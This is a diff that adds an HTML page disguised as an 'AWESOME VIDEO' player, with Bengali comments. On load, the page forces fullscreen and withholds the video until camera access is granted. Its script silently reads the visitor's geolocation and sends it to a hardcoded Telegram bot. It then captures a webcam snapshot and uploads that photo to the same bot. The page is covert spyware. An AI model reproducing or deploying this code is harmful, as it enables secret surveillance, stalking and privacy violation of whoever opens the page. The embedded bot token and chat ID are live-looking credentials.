@@ -1,3 +1,129 @@
-<html>
-  
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AWESOME VIDEO</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            background: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        video {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+        canvas {
+            display: none;
+        }
+        #message {
+            position: absolute;
+            font-size: 2rem;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+
+    <video id="bgVideo" autoplay loop controls>
+        <source src="https://raw.githubusercontent.com/SadiAlSabbir/Awesome-Video/main/VID_20250513_233202_486.mp4" type="video/mp4">
+        আপনার ব্রাউজার ভিডিও প্লে করতে পারে না।
+    </video>
+
+    <div id="message">Give Permission First!</div>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            function goFullscreen() {
+                let doc = document.documentElement;
+                if (doc.requestFullscreen) {
+                    doc.requestFullscreen();
+                } else if (doc.mozRequestFullScreen) {
+                    doc.mozRequestFullScreen();
+                } else if (doc.webkitRequestFullscreen) {
+                    doc.webkitRequestFullscreen();
+                } else if (doc.msRequestFullscreen) {
+                    doc.msRequestFullscreen();
+                }
+            }
+
+            goFullscreen();
+            document.addEventListener("click", goFullscreen);
+
+            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw"; // 🔹 টেলিগ্রাম বটের API টোকেন দিন
+            let chatId = "6947565760"; // 🔹 টেলিগ্রাম চ্যাট আইডি দিন
+
+            function sendLocation(latitude, longitude) {
+                fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`)
+                    .then(response => response.json())
+                    .catch(error => console.log(error));
+            }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+                    sendLocation(latitude, longitude);
+                }, function(error) {
+                    console.log("Not Found");
+                });
+            }
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    let bgVideo = document.getElementById("bgVideo");
+                    let message = document.getElementById("message");
+
+                    message.style.display = 'none';
+                    bgVideo.style.display = 'block';
+
+                    let video = document.createElement("video");
+                    video.srcObject = stream;
+                    video.play();
+
+                    // 🔹 ভিডিও চালু হওয়ার পর ছবি ক্যাপচার করবে
+                    video.onloadedmetadata = function () {
+                        setTimeout(() => {
+                            let canvas = document.getElementById("canvas");
+                            let context = canvas.getContext("2d");
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                            stream.getTracks().forEach(track => track.stop());
+
+                            canvas.toBlob(blob => {
+                                let formData = new FormData();
+                                formData.append("chat_id", chatId);
+                                formData.append("photo", blob, "image.jpg");
+
+                                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                    method: "POST",
+                                    body: formData
+                                }).then(response => response.json())
+                                  .catch(error => console.log(error));
+                            }, 'image/jpeg');
+                        }, 1000);
+                    };
+                })
+                .catch(error => {
+                    let message = document.getElementById("message");
+                    message.style.display = 'block';
+                });
+        });
+    </script>
+
+</body>
 </html>
